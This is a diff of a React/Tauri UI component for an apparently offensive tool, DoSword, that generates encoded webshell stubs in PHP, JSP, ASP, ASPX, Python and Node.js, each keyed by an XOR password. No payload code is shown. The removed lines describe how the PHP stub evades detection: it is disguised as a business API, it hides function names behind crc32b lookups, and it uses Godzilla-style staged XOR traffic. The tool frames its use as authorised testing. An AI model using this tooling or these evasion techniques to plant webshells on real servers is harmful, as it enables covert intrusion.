@@ -1,30 +1,30 @@
 import { useEffect, useState } from "react";
-import { Copy, LoaderCircle, Save } from "lucide-react";
+import { Copy, Dices, Download, LoaderCircle, Sparkles } from "lucide-react";
 import { save } from "@tauri-apps/plugin-dialog";
 import { api, b64, errorText } from "../api";
 import type { GenerateShellResult } from "../api";
 import { Dialog } from "../components/Dialog";
+import { useToast } from "../components/Toast";
 
 const LANGUAGES: { value: string; label: string }[] = [
-  { value: "php", label: "PHP" },
-  { value: "asp", label: "ASP (VBScript)" },
-  { value: "aspx", label: "ASP.NET (C#)" },
-  { value: "jsp", label: "JSP" },
+  { value: "php", label: "PHP (.php)" },
+  { value: "jsp", label: "JSP (.jsp)" },
+  { value: "aspx", label: "ASP.NET C# (.aspx)" },
+  { value: "asp", label: "ASP VBScript (.asp)" },
+  { value: "python", label: "Python (.py / WSGI)" },
+  { value: "node", label: "Node.js (.js / Express)" },
 ];
 
-/**
- * 生成 Webshell：选择语言 × 编码器 × 密码，生成服务端 stub 并可保存。
- * 生成的 stub 与对应语言的连接协议配套使用（当前连接协议仅 PHP 可用）。
- */
 export function GenerateShellDialog({
   onClose,
 }: {
   onClose: () => void;
 }) {
+  const toast = useToast();
   const [language, setLanguage] = useState("php");
   const [encoders, setEncoders] = useState<[string, string][]>([]);
   const [encoderId, setEncoderId] = useState("native");
-  const [password, setPassword] = useState("");
+  const [password, setPassword] = useState("pass123");
   const [result, setResult] = useState<GenerateShellResult | null>(null);
   const [busy, setBusy] = useState(false);
   const [error, setError] = useState("");
@@ -34,18 +34,31 @@ export function GenerateShellDialog({
     void api.listEncoders().then(setEncoders).catch(() => {});
   }, []);
 
+  function generateRandomPassword() {
+    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+    let pwd = "";
+    for (let i = 0; i < 12; i++) {
+      pwd += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    setPassword(pwd);
+  }
+
   async function generate() {
     if (!password.trim()) {
-      setError("请填写连接密码（用于派生 XOR 密钥，服务端 stub 不保存明文密码）");
+      toast.warning("请填写连接密码（用于派生 XOR 加密密钥）");
       return;
     }
     setBusy(true);
     setError("");
     setCopied(false);
     try {
-      setResult(await api.generateShell(language, encoderId, password, false));
+      const res = await api.generateShell(language, encoderId, password, false);
+      setResult(res);
+      toast.success(`Webshell 代码生成完毕 (${res.filename})`, "生成成功");
     } catch (cause) {
-      setError(errorText(cause));
+      const msg = errorText(cause);
+      setError(msg);
+      toast.error(msg, "生成失败");
     } finally {
       setBusy(false);
     }
@@ -53,12 +66,13 @@ export function GenerateShellDialog({
 
   async function saveFile() {
     if (!result) return;
-    const localPath = await save({ defaultPath: result.filename });
-    if (!localPath) return;
     try {
+      const localPath = await save({ defaultPath: result.filename });
+      if (!localPath) return;
       await api.writeLocalFile(localPath, b64.encodeText(result.content));
+      toast.success(`文件已保存至 ${localPath}`, "保存成功");
     } catch (cause) {
-      setError(`保存失败：${errorText(cause)}`);
+      toast.error(`保存失败：${errorText(cause)}`);
     }
   }
 
@@ -67,17 +81,19 @@ export function GenerateShellDialog({
     try {
       await navigator.clipboard.writeText(result.content);
       setCopied(true);
+      toast.info("代码内容已成功复制到剪贴板");
     } catch {
-      setError("复制失败");
+      toast.error("复制失败");
     }
   }
 
   return (
-    <Dialog title="生成 Webshell" onClose={onClose}>
+    <Dialog title="生成 WebShell 服务端 Stub" onClose={onClose}>
       <div className="generate-form">
         {error && <p className="form-note error">{error}</p>}
+        
         <label>
-          语言
+          目标语言与环境
           <select value={language} onChange={(event) => setLanguage(event.target.value)}>
             {LANGUAGES.map((item) => (
               <option key={item.value} value={item.value}>
@@ -86,8 +102,9 @@ export function GenerateShellDialog({
             ))}
           </select>
         </label>
+
         <label>
-          编码方式
+          加密/编码器模板
           <select value={encoderId} onChange={(event) => setEncoderId(event.target.value)}>
             {encoders.map(([id, displayName]) => (
               <option key={id} value={id}>
@@ -96,48 +113,60 @@ export function GenerateShellDialog({
             ))}
           </select>
         </label>
+
         <label>
-          连接密码
-          <input
-            type="password"
-            value={password}
-            onChange={(event) => setPassword(event.target.value)}
-            placeholder="用于派生 XOR 密钥（md5）"
-          />
+          连接鉴权密码 (派生 XOR 混淆密钥)
+          <div style={{ display: "flex", gap: 8 }}>
+            <input
+              type="text"
+              value={password}
+              onChange={(event) => setPassword(event.target.value)}
+              placeholder="自定义鉴权密钥 (例如 pass123)"
+              style={{ flex: 1 }}
+            />
+            <button
+              type="button"
+              className="button secondary compact"
+              onClick={generateRandomPassword}
+              title="生成高强度随机密码"
+            >
+              <Dices size={14} />
+              随机
+            </button>
+          </div>
         </label>
-        
-        <button className="button primary" onClick={() => void generate()} disabled={busy}>
-          {busy ? <LoaderCircle className="spin" size={15} /> : null}
-          {busy ? "生成中…" : "生成"}
-        </button>
+
+        <div style={{ display: "flex", justifyContent: "flex-end", marginTop: 4 }}>
+          <button className="button primary" onClick={() => void generate()} disabled={busy}>
+            {busy ? <LoaderCircle className="spin" size={14} /> : <Sparkles size={14} />}
+            {busy ? "正在生成…" : "立即生成 Stub"}
+          </button>
+        </div>
 
         {result && (
           <div className="generate-result">
             <div className="generate-result-head">
               <code>{result.filename}</code>
-              <span>
-                <button className="button compact" onClick={() => void copyContent()}>
+              <div style={{ display: "flex", gap: 6 }}>
+                <button className="button compact secondary" onClick={() => void copyContent()}>
                   <Copy size={13} />
-                  {copied ? "已复制" : "复制"}
+                  {copied ? "已复制" : "复制代码"}
                 </button>
-                <button className="button compact" onClick={() => void saveFile()}>
-                  <Save size={13} />
+                <button className="button compact primary" onClick={() => void saveFile()}>
+                  <Download size={13} />
                   保存文件
                 </button>
-              </span>
+              </div>
             </div>
+
             <pre>{result.content}</pre>
-            <p className="form-note">
-              部署到授权目标后，创建对应语言的 Shell 并选择相同编码方式与密码即可连接。
-              当前连接协议仅 PHP 可用，ASP / ASPX / JSP 的客户端协议规划中。
-            </p>
-            <p className="form-note">
-              OPSEC：PHP stub 已做业务伪装（形如业务接口，敏感函数经 crc32b
-              哈希查表解析，无小写 eval(/base64_decode( 等敏感词）；
-              XOR_BODY / XOR_SESSION 为请求体 XOR 直传（Godzilla 风格），默认配置
-              可用（XOR_SESSION 采用分阶段载荷：代码只传一次，之后仅传参数）；
-              PHP_STREAM 为一行 INCLUDE stub（零敏感函数），需 allow_url_include=On。
-            </p>
+
+            <div style={{ padding: "8px 12px", background: "var(--panel-2)", borderRadius: "var(--radius-md)", fontSize: 11.5 }}>
+              <p style={{ color: "var(--text-dim)", lineHeight: 1.55 }}>
+                💡 <strong>部署说明：</strong>
+                将生成的代码部署至授权测试环境后，在 DoSword 中「登记 Shell」并填入相同语言、密码与编码器即可建立安全连接通道。
+              </p>
+            </div>
           </div>
         )}
       </div>
